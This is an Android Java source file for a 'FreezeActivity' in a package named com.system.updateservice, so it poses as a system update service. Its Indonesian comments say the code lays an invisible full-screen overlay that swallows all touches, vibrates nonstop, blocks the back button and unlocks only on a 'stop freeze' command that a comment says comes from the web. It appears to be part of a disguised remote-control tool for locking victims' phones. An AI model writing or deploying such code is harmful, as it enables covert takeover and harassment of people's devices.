package com.system.updateservice;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Bundle;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;

public class FreezeActivity extends Activity {
    private Vibrator vibrator;
    private BroadcastReceiver stopFreezeReceiver;
    private WindowManager windowManager;
    private View overlayView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Bikin Activity jadi transparan dan lempar ke background
        // Biar layar Home Screen atau aplikasi lain tetep keliatan
        setTheme(android.R.style.Theme_Translucent_NoTitleBar_Fullscreen);
        moveTaskToBack(true);

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        
        // Bikin frame layout transparan seukuran layar
        FrameLayout layout = new FrameLayout(this);
        layout.setBackgroundColor(Color.TRANSPARENT); 
        
        // Sedot semua sentuhan (biar layar ga bisa digeser/diklik)
        layout.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                return true; // True = abaikan sentuhan
            }
        });

        int layoutType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? 
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 
                WindowManager.LayoutParams.TYPE_PHONE;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                layoutType,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | 
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
        );

        windowManager.addView(layout, params);
        overlayView = layout;

        // Getar Nonstop
        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (vibrator != null && vibrator.hasVibrator()) {
            long[] pattern = {0, 1000, 500};
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0));
            } else {
                vibrator.vibrate(pattern, 0);
            }
        }

        // Dengerin perintah Stop Freeze dari web
        stopFreezeReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                cleanupAndFinish();
            }
        };
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(stopFreezeReceiver, new IntentFilter("ACTION_STOP_FREEZE"), Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(stopFreezeReceiver, new IntentFilter("ACTION_STOP_FREEZE"));
        }
    }

    private void cleanupAndFinish() {
        if (vibrator != null) vibrator.cancel();
        if (overlayView != null && windowManager != null) {
            try { windowManager.removeView(overlayView); } catch (Exception e) {}
        }
        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (vibrator != null) vibrator.cancel();
        if (overlayView != null && windowManager != null) {
            try { windowManager.removeView(overlayView); } catch (Exception e) {}
        }
        try { unregisterReceiver(stopFreezeReceiver); } catch (Exception e) {}
    }
    
    @Override
    public void onBackPressed() { }
}
